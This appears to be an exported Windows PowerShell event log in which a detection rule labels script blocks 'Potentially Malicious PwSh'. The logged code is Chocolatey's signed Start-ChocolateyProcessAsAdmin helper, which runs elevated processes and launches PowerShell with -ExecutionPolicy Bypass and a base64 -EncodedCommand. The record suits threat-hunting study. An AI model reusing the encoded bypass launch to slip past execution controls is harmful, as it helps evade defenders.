EwxEaWdpQ2VydCBJbmMxGTAXBgNVBAsTEHd3dy5kaWdpY2VydC5jb20xITAfBgNV # BAMTGERpZ2lDZXJ0IEFzc3VyZWQgSUQgQ0EtMQIQAwGaAjr/WLFr1tXq5hfwZjAJ # BgUrDgMCGgUAoF0wGAYJKoZIhvcNAQkDMQsGCSqGSIb3DQEHATAcBgkqhkiG9w0B # CQUxDxcNMTkwMzE1MTc1NzAwWjAjBgkqhkiG9w0BCQQxFgQUjP95hMVfZNWYfVjI # L9Cgest1f1MwDQYJKoZIhvcNAQEBBQAEggEALzknQ55rcp9crkxee1A87etbTGT+ # iJZqbaxZIe+Sj34Ml53OIqvMQj35ygkKq02ONTDQiK5EVlYLm8+1Dn/xPF0nanDt # SaihFMa2VKo3mcwDUy4E6vTUfmFrMpCcYXxmbYghGFQO7e6Izq+6UtQIG19mj8Hn # c+6wbmlKuqaJa2KFx5X2QFOoOP18QUeKxDZelbDClc6TRKIlMRuihofcRCByF2Bj # MNpDySXfRafleMS1EybFmmNVrdnaqx+ncCF1ud/niIEH1rAUb52RyPg+WiqGXtUB # PqBJonzDwmRxEvj/a6qYMM+neDEC+DjnSF0CtNZK1rW6MFDgHS+FFvv/kQ== # SIG # End signature block","73be1519-4648-4ed7-b305-605504afc242"
"2019-03-19 14:21:37.110 +01:00","Potentially Malicious PwSh","med","MSEDGEWIN10","PwSh",4104,77,"ScriptBlock: # Copyright © 2017 Chocolatey Software, Inc. # Copyright © 2015 - 2017 RealDimensions Software, LLC # Copyright © 2011 - 2015 RealDimensions Software, LLC & original authors/contributors from https://github.com/chocolatey/chocolatey # # Licensed under the Apache License, Version 2.0 (the ""License""); # you may not use this file except in compliance with the License. # You may obtain a copy of the License at # # http://www.apache.org/licenses/LICENSE-2.0 # # Unless required by applicable law or agreed to in writing, software # distributed under the License is distributed on an ""AS IS"" BASIS, # WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied. # See the License for the specific language governing permissions and # limitations under the License. function Start-ChocolateyProcessAsAdmin { <# .SYNOPSIS **NOTE:** Administrative Access Required. Runs a process with administrative privileges. If `-ExeToRun` is not specified, it is run with PowerShell. .NOTES This command will assert UAC/Admin privileges on the machine. Starting in 0.9.10, will automatically call Set-PowerShellExitCode to set the package exit code in the following ways: - 4 if the binary turns out to be a text file. - The same exit code returned from the process that is run. If a 3010 is returned, it will set 3010 for the package. Aliases `Start-ChocolateyProcess` and `Invoke-ChocolateyProcess` available in 0.10.2+. .INPUTS None .OUTPUTS None .PARAMETER Statements Arguments to pass to `ExeToRun` or the PowerShell script block to be run. .PARAMETER ExeToRun The executable/application/installer to run. Defaults to `'powershell'`. .PARAMETER Elevated Indicate whether the process should run elevated. Available in 0.10.2+. .PARAMETER Minimized Switch indicating if a Windows pops up (if not called with a silent argument) that it should be minimized. .PARAMETER NoSleep Used only when calling PowerShell - indicates the window that is opened should return instantly when it is complete. .PARAMETER ValidExitCodes Array of exit codes indicating success. Defaults to `@(0)`. .PARAMETER WorkingDirectory The working directory for the running process. Defaults to `Get-Location`. Available in 0.10.1+. .PARAMETER SensitiveStatements Arguments to pass to `ExeToRun` that are not logged. Note that only licensed versions of Chocolatey provide a way to pass those values completely through without having them in the install script or on the system in some way. Available in 0.10.1+. .PARAMETER IgnoredArguments Allows splatting with arguments that do not apply. Do not use directly. .EXAMPLE Start-ChocolateyProcessAsAdmin -Statements ""$msiArgs"" -ExeToRun 'msiexec' .EXAMPLE Start-ChocolateyProcessAsAdmin -Statements ""$silentArgs"" -ExeToRun $file .EXAMPLE Start-ChocolateyProcessAsAdmin -Statements ""$silentArgs"" -ExeToRun $file -ValidExitCodes @(0,21) .EXAMPLE > # Run PowerShell statements $psFile = Join-Path ""$(Split-Path -parent $MyInvocation.MyCommand.Definition)"" 'someInstall.ps1' Start-ChocolateyProcessAsAdmin ""& `'$psFile`'"" .EXAMPLE # This also works for cmd and is required if you have any spaces in the paths within your command $appPath = ""$env:ProgramFiles\myapp"" $cmdBatch = ""/c `""$appPath\bin\installmyappservice.bat`"""" Start-ChocolateyProcessAsAdmin $cmdBatch cmd # or more explicitly Start-ChocolateyProcessAsAdmin -Statements $cmdBatch -ExeToRun ""cmd.exe"" .LINK Install-ChocolateyPackage .LINK Install-ChocolateyInstallPackage #> param( [parameter(Mandatory=$false, Position=0)][string[]] $statements, [parameter(Mandatory=$false, Position=1)][string] $exeToRun = 'powershell', [parameter(Mandatory=$false)][switch] $elevated = $true, [parameter(Mandatory=$false)][switch] $minimized, [parameter(Mandatory=$false)][switch] $noSleep, [parameter(Mandatory=$false)] $validExitCodes = @(0), [parameter(Mandatory=$false)][string] $workingDirectory = $(Get-Location), [parameter(Mandatory=$false)][string] $sensitiveStatements = '', [parameter(ValueFromRemainingArguments = $true)][Object[]] $ignoredArguments ) [string]$statements = $statements -join ' ' Write-FunctionCallLogMessage -Invocation $MyInvocation -Parameters $PSBoundParameters $alreadyElevated = $false if (Test-ProcessAdminRights) { $alreadyElevated = $true } $dbMessagePrepend = ""Elevating permissions and running"" if (!$elevated) { $dbMessagePrepend = ""Running"" } try { if ($exeToRun -ne $null) { $exeToRun = $exeToRun -replace ""`0"", """" } if ($statements -ne $null) { $statements = $statements -replace ""`0"", """" } } catch { Write-Debug ""Removing null characters resulted in an error - $($_.Exception.Message)"" } if ($exeToRun -ne $null) { $exeToRun = $exeToRun.Trim().Trim(""'"").Trim('""') } $wrappedStatements = $statements if ($wrappedStatements -eq $null) { $wrappedStatements = ''} if ($exeToRun -eq 'powershell') { $exeToRun = ""$($env:SystemRoot)\System32\WindowsPowerShell\v1.0\powershell.exe"" $importChocolateyHelpers = ""& import-module -name '$helpersPath\chocolateyInstaller.psm1' -Verbose:`$false | Out-Null;"" $block = @"" `$noSleep = `$$noSleep #`$env:ChocolateyEnvironmentDebug='false' #`$env:ChocolateyEnvironmentVerbose='false' $importChocolateyHelpers try{ `$progressPreference=""SilentlyContinue"" $statements if(!`$noSleep){start-sleep 6} } catch{ if(!`$noSleep){start-sleep 8} throw } ""@ $encoded = [Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($block)) $wrappedStatements = ""-NoLogo -NonInteractive -NoProfile -ExecutionPolicy Bypass -InputFormat Text -OutputFormat Text -EncodedCommand $encoded"" $dbgMessage = @"" $dbMessagePrepend powershell block: $block This may take a while, depending on the statements. ""@ } else { $dbgMessage = @"" $dbMessagePrepend [`""$exeToRun`"" $wrappedStatements]. This may take a while, depending on the statements. ""@ } Write-Debug $dbgMessage $exeIsTextFile = [System.IO.Path]::GetFullPath($exeToRun) + "".istext"" if ([System.IO.File]::Exists($exeIsTextFile)) { Set-PowerShellExitCode 4 throw ""The file was a text file but is attempting to be run as an executable - '$exeToRun'"" } if ($exeToRun -eq 'msiexec' -or $exeToRun -eq 'msiexec.exe') { $exeToRun = ""$($env:SystemRoot)\System32\msiexec.exe"" } if (!([System.IO.File]::Exists($exeToRun)) -and $exeToRun -notmatch 'msiexec') { Write-Warning ""May not be able to find '$exeToRun'. Please use full path for executables."" # until we have search paths enabled, let's just pass a warning #Set-PowerShellExitCode 2 #throw ""Could not find '$exeToRun'"" } # Redirecting output slows things down a bit. $writeOutput = { if ($EventArgs.Data -ne $null) { Write-Verbose ""$($EventArgs.Data)"" } } $writeError = { if ($EventArgs.Data -ne $null) { Write-Error ""$($EventArgs.Data)"" } } $process = New-Object System.Diagnostics.Process $process.EnableRaisingEvents = $true Register-ObjectEvent -InputObject $process -SourceIdentifier ""LogOutput_ChocolateyProc"" -EventName OutputDataReceived -Action $writeOutput | Out-Null Register-ObjectEvent -InputObject $process -SourceIdentifier ""LogErrors_ChocolateyProc"" -EventName ErrorDataReceived -Action $writeError | Out-Null #$process.StartInfo = New-Object System.Diagnostics.ProcessStartInfo($exeToRun, $wrappedStatements) # in case empty args makes a difference, try to be compatible with the older # version $psi = New-Object System.Diagnostics.ProcessStartInfo $psi.FileName = $exeToRun if ($wrappedStatements -ne '') { $psi.Arguments = ""$wrappedStatements"" } if ($sensitiveStatements -ne $null -and $sensitiveStatements -ne '') { Write-Host ""Sensitive arguments have been passed. Adding to arguments."" $psi.Arguments += "" $sensitiveStatements"" } $process.StartInfo = $psi # process start info $process.StartInfo.RedirectStandardOutput = $true $process.StartInfo.RedirectStandardError = $true $process.StartInfo.UseShellExecute = $false $process.StartInfo.WorkingDirectory = $workingDirectory if ($elevated -and -not $alreadyElevated -and [Environment]::OSVersion.Version -ge (New-Object 'Version' 6,0)){ # this doesn't actually currently work - because we are not running under shell execute Write-Debug ""Setting RunAs for elevation"" $process.StartInfo.Verb = ""RunAs"" } if ($minimized) { $process.StartInfo.WindowStyle = [System.Diagnostics.ProcessWindowStyle]::Minimized } $process.Start() | Out-Null if ($process.StartInfo.RedirectStandardOutput) { $process.BeginOutputReadLine() } if ($process.StartInfo.RedirectStandardError) { $process.BeginErrorReadLine() } $process.WaitForExit() # For some reason this forces the jobs to finish and waits for # them to do so. Without this it never finishes. Unregister-Event -SourceIdentifier ""LogOutput_ChocolateyProc"" Unregister-Event -SourceIdentifier ""LogErrors_ChocolateyProc"" # sometimes the process hasn't fully exited yet. for ($loopCount=1; $loopCount -le 15; $loopCount++) { if ($process.HasExited) { break; } Write-Debug ""Waiting for process to exit - $loopCount/15 seconds""; Start-Sleep 1; } $exitCode = $process.ExitCode $process.Dispose() Write-Debug ""Command [`""$exeToRun`"" $wrappedStatements] exited with `'$exitCode`'."" $exitErrorMessage = '' $errorMessageAddendum = "" This is most likely an issue with the '$env:chocolateyPackageName' package and not with Chocolatey itself. Please follow up with the package maintainer(s) directly."" switch ($exitCode) { 0 { break } 1 { break } 3010 { break } # NSIS - http://nsis.sourceforge.net/Docs/AppendixD.html # InnoSetup - http://www.jrsoftware.org/ishelp/index.php?topic=setupexitcodes 2 { $exitErrorMessage = 'Setup was cancelled.'; break } 3 { $exitErrorMessage = 'A fatal error occurred when preparing or moving to next install phase. Check to be sure you have enough memory to perform an installation and try again.'; break } 4 { $exitErrorMessage = 'A fatal error occurred during installation process.' + $errorMessageAddendum; break } 5 { $exitErrorMessage = 'User (you) cancelled the installation.'; break } 6 { $exitErrorMessage = 'Setup process was forcefully terminated by the debugger.'; break } 7 { $exitErrorMessage = 'While preparing to install, it was determined setup cannot proceed with the installation. Please be sure the software can be installed on your system.'; break } 8 { $exitErrorMessage = 'While preparing to install, it was determined setup cannot proceed with the installation until you restart the system. Please reboot and try again.'; break } # MSI - https://msdn.microsoft.com/en-us/library/windows/desktop/aa376931.aspx 1602 { $exitErrorMessage = 'User (you) cancelled the installation.'; break } 1603 { $exitErrorMessage = ""Generic MSI Error. This is a local environment error, not an issue with a package or the MSI itself - it could mean a pending reboot is necessary prior to install or something else (like the same version is already installed). Please see MSI log if available. If not, try again adding `'--install-arguments=`""`'/l*v c:\$($env:chocolateyPackageName)_msi_install.log`'`""`'. Then search the MSI Log for `""Return Value 3`"" and look above that for the error.""; break } 1618 { $exitErrorMessage = 'Another installation currently in progress. Try again later.'; break } 1619 { $exitErrorMessage = 'MSI could not be found - it is possibly corrupt or not an MSI at all. If it was downloaded and the MSI is less than 30K, try opening it in an editor like Notepad++ as it is likely HTML.' + $errorMessageAddendum; break } 1620 { $exitErrorMessage = 'MSI could not be opened - it is possibly corrupt or not an MSI at all. If it was downloaded and the MSI is less than 30K, try opening it in an editor like Notepad++ as it is likely HTML.' + $errorMessageAddendum; break } 1622 { $exitErrorMessage = 'Something is wrong with the install log location specified. Please fix this in the package silent arguments (or in install arguments you specified). The directory specified as part of the log file path must exist for an MSI to be able to log to that directory.' + $errorMessageAddendum; break } 1623 { $exitErrorMessage = 'This MSI has a language that is not supported by your system. Contact package maintainer(s) if there is an install available in your language and you would like it added to the packaging.'; break } 1625 { $exitErrorMessage = 'Installation of this MSI is forbidden by system policy. Please contact your system administrators.'; break } 1632 { $exitErrorMessage = 'Installation of this MSI is not supported on this platform. Contact package maintainer(s) if you feel this is in error or if you need an architecture that is not available with the current packaging.'; break } 1633 { $exitErrorMessage = 'Installation of this MSI is not supported on this platform. Contact package maintainer(s) if you feel this is in error or if you need an architecture that is not available with the current packaging.'; break } 1638 { $exitErrorMessage = 'This MSI requires uninstall prior to installing a different version. Please ask the package maintainer(s) to add a check in the chocolateyInstall.ps1 script and uninstall if the software is installed.' + $errorMessageAddendum; break } 1639 { $exitErrorMessage = 'The command line arguments passed to the MSI are incorrect. If you passed in additional arguments, please adjust. Otherwise followup with the package maintainer(s) to get this fixed.' + $errorMessageAddendum; break } 1640 { $exitErrorMessage = 'Cannot install MSI when running from remote desktop (terminal services). This should automatically be handled in licensed editions. For open source editions, you may need to run change.exe prior to running Chocolatey or not use terminal services.'; break } 1645 { $exitErrorMessage = 'Cannot install MSI when running from remote desktop (terminal services). This should automatically be handled in licensed editions. For open source editions, you may need to run change.exe prior to running Chocolatey or not use terminal services.'; break } } if ($exitErrorMessage) { $errorMessageSpecific = ""Exit code indicates the following: $exitErrorMessage."" Write-Warning $exitErrorMessage } else { $errorMessageSpecific = 'See log for possible error messages","MessageNumber: 1 ¦ MessageTotal: 2 ¦ Path: C:\ProgramData\chocolatey\helpers\functions\Start-ChocolateyProcessAsAdmin.ps1 ¦ ScriptBlockId: efa6376f-795e-4cc9-8eb0-d1f6d66c573e ¦ ScriptBlockText: # Copyright © 2017 Chocolatey Software, Inc. # Copyright © 2015 - 2017 RealDimensions Software, LLC # Copyright © 2011 - 2015 RealDimensions Software, LLC & original authors/contributors from https://github.com/chocolatey/chocolatey # # Licensed under the Apache License, Version 2.0 (the ""License""); # you may not use this file except in compliance with the License. # You may obtain a copy of the License at # # http://www.apache.org/licenses/LICENSE-2.0 # # Unless required by applicable law or agreed to in writing, software # distributed under the License is distributed on an ""AS IS"" BASIS, # WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied. # See the License for the specific language governing permissions and # limitations under the License. function Start-ChocolateyProcessAsAdmin { <# .SYNOPSIS **NOTE:** Administrative Access Required. Runs a process with administrative privileges. If `-ExeToRun` is not specified, it is run with PowerShell. .NOTES This command will assert UAC/Admin privileges on the machine. Starting in 0.9.10, will automatically call Set-PowerShellExitCode to set the package exit code in the following ways: - 4 if the binary turns out to be a text file. - The same exit code returned from the process that is run. If a 3010 is returned, it will set 3010 for the package. Aliases `Start-ChocolateyProcess` and `Invoke-ChocolateyProcess` available in 0.10.2+. .INPUTS None .OUTPUTS None .PARAMETER Statements Arguments to pass to `ExeToRun` or the PowerShell script block to be run. .PARAMETER ExeToRun The executable/application/installer to run. Defaults to `'powershell'`. .PARAMETER Elevated Indicate whether the process should run elevated. Available in 0.10.2+. .PARAMETER Minimized Switch indicating if a Windows pops up (if not called with a silent argument) that it should be minimized. .PARAMETER NoSleep Used only when calling PowerShell - indicates the window that is opened should return instantly when it is complete. .PARAMETER ValidExitCodes Array of exit codes indicating success. Defaults to `@(0)`. .PARAMETER WorkingDirectory The working directory for the running process. Defaults to `Get-Location`. Available in 0.10.1+. .PARAMETER SensitiveStatements Arguments to pass to `ExeToRun` that are not logged. Note that only licensed versions of Chocolatey provide a way to pass those values completely through without having them in the install script or on the system in some way. Available in 0.10.1+. .PARAMETER IgnoredArguments Allows splatting with arguments that do not apply. Do not use directly. .EXAMPLE Start-ChocolateyProcessAsAdmin -Statements ""$msiArgs"" -ExeToRun 'msiexec' .EXAMPLE Start-ChocolateyProcessAsAdmin -Statements ""$silentArgs"" -ExeToRun $file .EXAMPLE Start-ChocolateyProcessAsAdmin -Statements ""$silentArgs"" -ExeToRun $file -ValidExitCodes @(0,21) .EXAMPLE > # Run PowerShell statements $psFile = Join-Path ""$(Split-Path -parent $MyInvocation.MyCommand.Definition)"" 'someInstall.ps1' Start-ChocolateyProcessAsAdmin ""& `'$psFile`'"" .EXAMPLE # This also works for cmd and is required if you have any spaces in the paths within your command $appPath = ""$env:ProgramFiles\myapp"" $cmdBatch = ""/c `""$appPath\bin\installmyappservice.bat`"""" Start-ChocolateyProcessAsAdmin $cmdBatch cmd # or more explicitly Start-ChocolateyProcessAsAdmin -Statements $cmdBatch -ExeToRun ""cmd.exe"" .LINK Install-ChocolateyPackage .LINK Install-ChocolateyInstallPackage #> param( [parameter(Mandatory=$false, Position=0)][string[]] $statements, [parameter(Mandatory=$false, Position=1)][string] $exeToRun = 'powershell', [parameter(Mandatory=$false)][switch] $elevated = $true, [parameter(Mandatory=$false)][switch] $minimized, [parameter(Mandatory=$false)][switch] $noSleep, [parameter(Mandatory=$false)] $validExitCodes = @(0), [parameter(Mandatory=$false)][string] $workingDirectory = $(Get-Location), [parameter(Mandatory=$false)][string] $sensitiveStatements = '', [parameter(ValueFromRemainingArguments = $true)][Object[]] $ignoredArguments ) [string]$statements = $statements -join ' ' Write-FunctionCallLogMessage -Invocation $MyInvocation -Parameters $PSBoundParameters $alreadyElevated = $false if (Test-ProcessAdminRights) { $alreadyElevated = $true } $dbMessagePrepend = ""Elevating permissions and running"" if (!$elevated) { $dbMessagePrepend = ""Running"" } try { if ($exeToRun -ne $null) { $exeToRun = $exeToRun -replace ""`0"", """" } if ($statements -ne $null) { $statements = $statements -replace ""`0"", """" } } catch { Write-Debug ""Removing null characters resulted in an error - $($_.Exception.Message)"" } if ($exeToRun -ne $null) { $exeToRun = $exeToRun.Trim().Trim(""'"").Trim('""') } $wrappedStatements = $statements if ($wrappedStatements -eq $null) { $wrappedStatements = ''} if ($exeToRun -eq 'powershell') { $exeToRun = ""$($env:SystemRoot)\System32\WindowsPowerShell\v1.0\powershell.exe"" $importChocolateyHelpers = ""& import-module -name '$helpersPath\chocolateyInstaller.psm1' -Verbose:`$false | Out-Null;"" $block = @"" `$noSleep = `$$noSleep #`$env:ChocolateyEnvironmentDebug='false' #`$env:ChocolateyEnvironmentVerbose='false' $importChocolateyHelpers try{ `$progressPreference=""SilentlyContinue"" $statements if(!`$noSleep){start-sleep 6} } catch{ if(!`$noSleep){start-sleep 8} throw } ""@ $encoded = [Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($block)) $wrappedStatements = ""-NoLogo -NonInteractive -NoProfile -ExecutionPolicy Bypass -InputFormat Text -OutputFormat Text -EncodedCommand $encoded"" $dbgMessage = @"" $dbMessagePrepend powershell block: $block This may take a while, depending on the statements. ""@ } else { $dbgMessage = @"" $dbMessagePrepend [`""$exeToRun`"" $wrappedStatements]. This may take a while, depending on the statements. ""@ } Write-Debug $dbgMessage $exeIsTextFile = [System.IO.Path]::GetFullPath($exeToRun) + "".istext"" if ([System.IO.File]::Exists($exeIsTextFile)) { Set-PowerShellExitCode 4 throw ""The file was a text file but is attempting to be run as an executable - '$exeToRun'"" } if ($exeToRun -eq 'msiexec' -or $exeToRun -eq 'msiexec.exe') { $exeToRun = ""$($env:SystemRoot)\System32\msiexec.exe"" } if (!([System.IO.File]::Exists($exeToRun)) -and $exeToRun -notmatch 'msiexec') { Write-Warning ""May not be able to find '$exeToRun'. Please use full path for executables."" # until we have search paths enabled, let's just pass a warning #Set-PowerShellExitCode 2 #throw ""Could not find '$exeToRun'"" } # Redirecting output slows things down a bit. $writeOutput = { if ($EventArgs.Data -ne $null) { Write-Verbose ""$($EventArgs.Data)"" } } $writeError = { if ($EventArgs.Data -ne $null) { Write-Error ""$($EventArgs.Data)"" } } $process = New-Object System.Diagnostics.Process $process.EnableRaisingEvents = $true Register-ObjectEvent -InputObject $process -SourceIdentifier ""LogOutput_ChocolateyProc"" -EventName OutputDataReceived -Action $writeOutput | Out-Null Register-ObjectEvent -InputObject $process -SourceIdentifier ""LogErrors_ChocolateyProc"" -EventName ErrorDataReceived -Action $writeError | Out-Null #$process.StartInfo = New-Object System.Diagnostics.ProcessStartInfo($exeToRun, $wrappedStatements) # in case empty args makes a difference, try to be compatible with the older # version $psi = New-Object System.Diagnostics.ProcessStartInfo $psi.FileName = $exeToRun if ($wrappedStatements -ne '') { $psi.Arguments = ""$wrappedStatements"" } if ($sensitiveStatements -ne $null -and $sensitiveStatements -ne '') { Write-Host ""Sensitive arguments have been passed. Adding to arguments."" $psi.Arguments += "" $sensitiveStatements"" } $process.StartInfo = $psi # process start info $process.StartInfo.RedirectStandardOutput = $true $process.StartInfo.RedirectStandardError = $true $process.StartInfo.UseShellExecute = $false $process.StartInfo.WorkingDirectory = $workingDirectory if ($elevated -and -not $alreadyElevated -and [Environment]::OSVersion.Version -ge (New-Object 'Version' 6,0)){ # this doesn't actually currently work - because we are not running under shell execute Write-Debug ""Setting RunAs for elevation"" $process.StartInfo.Verb = ""RunAs"" } if ($minimized) { $process.StartInfo.WindowStyle = [System.Diagnostics.ProcessWindowStyle]::Minimized } $process.Start() | Out-Null if ($process.StartInfo.RedirectStandardOutput) { $process.BeginOutputReadLine() } if ($process.StartInfo.RedirectStandardError) { $process.BeginErrorReadLine() } $process.WaitForExit() # For some reason this forces the jobs to finish and waits for # them to do so. Without this it never finishes. Unregister-Event -SourceIdentifier ""LogOutput_ChocolateyProc"" Unregister-Event -SourceIdentifier ""LogErrors_ChocolateyProc"" # sometimes the process hasn't fully exited yet. for ($loopCount=1; $loopCount -le 15; $loopCount++) { if ($process.HasExited) { break; } Write-Debug ""Waiting for process to exit - $loopCount/15 seconds""; Start-Sleep 1; } $exitCode = $process.ExitCode $process.Dispose() Write-Debug ""Command [`""$exeToRun`"" $wrappedStatements] exited with `'$exitCode`'."" $exitErrorMessage = '' $errorMessageAddendum = "" This is most likely an issue with the '$env:chocolateyPackageName' package and not with Chocolatey itself. Please follow up with the package maintainer(s) directly."" switch ($exitCode) { 0 { break } 1 { break } 3010 { break } # NSIS - http://nsis.sourceforge.net/Docs/AppendixD.html # InnoSetup - http://www.jrsoftware.org/ishelp/index.php?topic=setupexitcodes 2 { $exitErrorMessage = 'Setup was cancelled.'; break } 3 { $exitErrorMessage = 'A fatal error occurred when preparing or moving to next install phase. Check to be sure you have enough memory to perform an installation and try again.'; break } 4 { $exitErrorMessage = 'A fatal error occurred during installation process.' + $errorMessageAddendum; break } 5 { $exitErrorMessage = 'User (you) cancelled the installation.'; break } 6 { $exitErrorMessage = 'Setup process was forcefully terminated by the debugger.'; break } 7 { $exitErrorMessage = 'While preparing to install, it was determined setup cannot proceed with the installation. Please be sure the software can be installed on your system.'; break } 8 { $exitErrorMessage = 'While preparing to install, it was determined setup cannot proceed with the installation until you restart the system. Please reboot and try again.'; break } # MSI - https://msdn.microsoft.com/en-us/library/windows/desktop/aa376931.aspx 1602 { $exitErrorMessage = 'User (you) cancelled the installation.'; break } 1603 { $exitErrorMessage = ""Generic MSI Error. This is a local environment error, not an issue with a package or the MSI itself - it could mean a pending reboot is necessary prior to install or something else (like the same version is already installed). Please see MSI log if available. If not, try again adding `'--install-arguments=`""`'/l*v c:\$($env:chocolateyPackageName)_msi_install.log`'`""`'. Then search the MSI Log for `""Return Value 3`"" and look above that for the error.""; break } 1618 { $exitErrorMessage = 'Another installation currently in progress. Try again later.'; break } 1619 { $exitErrorMessage = 'MSI could not be found - it is possibly corrupt or not an MSI at all. If it was downloaded and the MSI is less than 30K, try opening it in an editor like Notepad++ as it is likely HTML.' + $errorMessageAddendum; break } 1620 { $exitErrorMessage = 'MSI could not be opened - it is possibly corrupt or not an MSI at all. If it was downloaded and the MSI is less than 30K, try opening it in an editor like Notepad++ as it is likely HTML.' + $errorMessageAddendum; break } 1622 { $exitErrorMessage = 'Something is wrong with the install log location specified. Please fix this in the package silent arguments (or in install arguments you specified). The directory specified as part of the log file path must exist for an MSI to be able to log to that directory.' + $errorMessageAddendum; break } 1623 { $exitErrorMessage = 'This MSI has a language that is not supported by your system. Contact package maintainer(s) if there is an install available in your language and you would like it added to the packaging.'; break } 1625 { $exitErrorMessage = 'Installation of this MSI is forbidden by system policy. Please contact your system administrators.'; break } 1632 { $exitErrorMessage = 'Installation of this MSI is not supported on this platform. Contact package maintainer(s) if you feel this is in error or if you need an architecture that is not available with the current packaging.'; break } 1633 { $exitErrorMessage = 'Installation of this MSI is not supported on this platform. Contact package maintainer(s) if you feel this is in error or if you need an architecture that is not available with the current packaging.'; break } 1638 { $exitErrorMessage = 'This MSI requires uninstall prior to installing a different version. Please ask the package maintainer(s) to add a check in the chocolateyInstall.ps1 script and uninstall if the software is installed.' + $errorMessageAddendum; break } 1639 { $exitErrorMessage = 'The command line arguments passed to the MSI are incorrect. If you passed in additional arguments, please adjust. Otherwise followup with the package maintainer(s) to get this fixed.' + $errorMessageAddendum; break } 1640 { $exitErrorMessage = 'Cannot install MSI when running from remote desktop (terminal services). This should automatically be handled in licensed editions. For open source editions, you may need to run change.exe prior to running Chocolatey or not use terminal services.'; break } 1645 { $exitErrorMessage = 'Cannot install MSI when running from remote desktop (terminal services). This should automatically be handled in licensed editions. For open source editions, you may need to run change.exe prior to running Chocolatey or not use terminal services.'; break } } if ($exitErrorMessage) { $errorMessageSpecific = ""Exit code indicates the following: $exitErrorMessage."" Write-Warning $exitErrorMessage } else { $errorMessageSpecific = 'See log for possible error messages","73be1519-4648-4ed7-b305-605504afc242"
"2019-03-19 14:21:37.110 +01:00","Potentially Malicious PwSh","med","MSEDGEWIN10","PwSh",4104,78,"ScriptBlock: .' } if ($validExitCodes -notcontains $exitCode) { Set-PowerShellExitCode $exitCode throw ""Running [`""$exeToRun`"" $wrappedStatements] was not successful. Exit code was '$exitCode'. $($errorMessageSpecific)"" } else { $chocoSuccessCodes = @(0, 1605, 1614, 1641, 3010) if ($chocoSuccessCodes -notcontains $exitCode) { Write-Warning ""Exit code '$exitCode' was considered valid by script, but not as a Chocolatey success code. Returning '0'."" $exitCode = 0 } } Write-Debug ""Finishing '$($MyInvocation.InvocationName)'"" return $exitCode } Set-Alias Start-ChocolateyProcess Start-ChocolateyProcessAsAdmin Set-Alias Invoke-ChocolateyProcess Start-ChocolateyProcessAsAdmin # SIG # Begin signature block # MIIcpwYJKoZIhvcNAQcCoIIcmDCCHJQCAQExDzANBglghkgBZQMEAgEFADB5Bgor # BgEEAYI3AgEEoGswaTA0BgorBgEEAYI3AgEeMCYCAwEAAAQQH8w7YFlLCE63JNLG # KX7zUQIBAAIBAAIBAAIBAAIBADAxMA0GCWCGSAFlAwQCAQUABCBM0B9N/gorGD8+ # +9Lu/ixd9N7cDuI0Q10kf6LMTBsNvqCCF7EwggUwMIIEGKADAgECAhAECRgbX9W7 # ZnVTQ7VvlVAIMA0GCSqGSIb3DQEBCwUAMGUxCzAJBgNVBAYTAlVTMRUwEwYDVQQK # EwxEaWdpQ2VydCBJbmMxGTAXBgNVBAsTEHd3dy5kaWdpY2VydC5jb20xJDAiBgNV # BAMTG0RpZ2lDZXJ0IEFzc3VyZWQgSUQgUm9vdCBDQTAeFw0xMzEwMjIxMjAwMDBa # Fw0yODEwMjIxMjAwMDBaMHIxCzAJBgNVBAYTAlVTMRUwEwYDVQQKEwxEaWdpQ2Vy # dCBJbmMxGTAXBgNVBAsTEHd3dy5kaWdpY2VydC5jb20xMTAvBgNVBAMTKERpZ2lD # ZXJ0IFNIQTIgQXNzdXJlZCBJRCBDb2RlIFNpZ25pbmcgQ0EwggEiMA0GCSqGSIb3 # DQEBAQUAA4IBDwAwggEKAoIBAQD407Mcfw4Rr2d3B9MLMUkZz9D7RZmxOttE9X/l # qJ3bMtdx6nadBS63j/qSQ8Cl+YnUNxnXtqrwnIal2CWsDnkoOn7p0WfTxvspJ8fT # eyOU5JEjlpB3gvmhhCNmElQzUHSxKCa7JGnCwlLyFGeKiUXULaGj6YgsIJWuHEqH # CN8M9eJNYBi+qsSyrnAxZjNxPqxwoqvOf+l8y5Kh5TsxHM/q8grkV7tKtel05iv+ # bMt+dDk2DZDv5LVOpKnqagqrhPOsZ061xPeM0SAlI+sIZD5SlsHyDxL0xY4PwaLo # LFH3c7y9hbFig3NBggfkOItqcyDQD2RzPJ6fpjOp/RnfJZPRAgMBAAGjggHNMIIB # yTASBgNVHRMBAf8ECDAGAQH/AgEAMA4GA1UdDwEB/wQEAwIBhjATBgNVHSUEDDAK # BggrBgEFBQcDAzB5BggrBgEFBQcBAQRtMGswJAYIKwYBBQUHMAGGGGh0dHA6Ly9v # Y3NwLmRpZ2ljZXJ0LmNvbTBDBggrBgEFBQcwAoY3aHR0cDovL2NhY2VydHMuZGln # aWNlcnQuY29tL0RpZ2lDZXJ0QXNzdXJlZElEUm9vdENBLmNydDCBgQYDVR0fBHow # eDA6oDigNoY0aHR0cDovL2NybDQuZGlnaWNlcnQuY29tL0RpZ2lDZXJ0QXNzdXJl # ZElEUm9vdENBLmNybDA6oDigNoY0aHR0cDovL2NybDMuZGlnaWNlcnQuY29tL0Rp # Z2lDZXJ0QXNzdXJlZElEUm9vdENBLmNybDBPBgNVHSAESDBGMDgGCmCGSAGG/WwA # AgQwKjAoBggrBgEFBQcCARYcaHR0cHM6Ly93d3cuZGlnaWNlcnQuY29tL0NQUzAK # BghghkgBhv1sAzAdBgNVHQ4EFgQUWsS5eyoKo6XqcQPAYPkt9mV1DlgwHwYDVR0j # BBgwFoAUReuir/SSy4IxLVGLp6chnfNtyA8wDQYJKoZIhvcNAQELBQADggEBAD7s # DVoks/Mi0RXILHwlKXaoHV0cLToaxO8wYdd+C2D9wz0PxK+L/e8q3yBVN7Dh9tGS # dQ9RtG6ljlriXiSBThCk7j9xjmMOE0ut119EefM2FAaK95xGTlz/kLEbBw6RFfu6 # r7VRwo0kriTGxycqoSkoGjpxKAI8LpGjwCUR4pwUR6F6aGivm6dcIFzZcbEMj7uo # +MUSaJ/PQMtARKUT8OZkDCUIQjKyNookAv4vcn4c10lFluhZHen6dGRrsutmQ9qz # sIzV6Q3d9gEgzpkxYz0IGhizgZtPxpMQBvwHgfqL2vmCSfdibqFT+hKUGIUukpHq # 